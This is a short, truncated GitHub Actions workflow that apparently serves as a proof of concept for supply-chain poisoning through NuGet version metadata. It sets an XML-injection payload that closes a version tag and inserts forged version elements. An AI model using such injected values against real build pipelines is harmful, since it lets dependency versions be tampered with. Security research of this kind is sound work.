name: "PoC: Supply Chain Integrity Bypass"
# Researcher: HackerMD
# Security Concern: Indirect Prompt Injection via Untrusted NuGet Metadata

on:
  workflow_dispatch:

jobs:
  exploit-validation:
    name: "Simulate Supply Chain Poisoning"
    runs-on: ubuntu-latest
    steps:
      - name: "Clone Repository Infrastructure"
        uses: actions/checkout@v4

      - name: "Simulate Malicious Upstream Metadata"
        id: upstream
        # Using environment variables to safely handle special XML characters
        env:
          PAYLOAD: "1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>666</AspNetCoreMajorVersion><SystemMemoryVersion>9.9.9</SystemMemoryVersion>
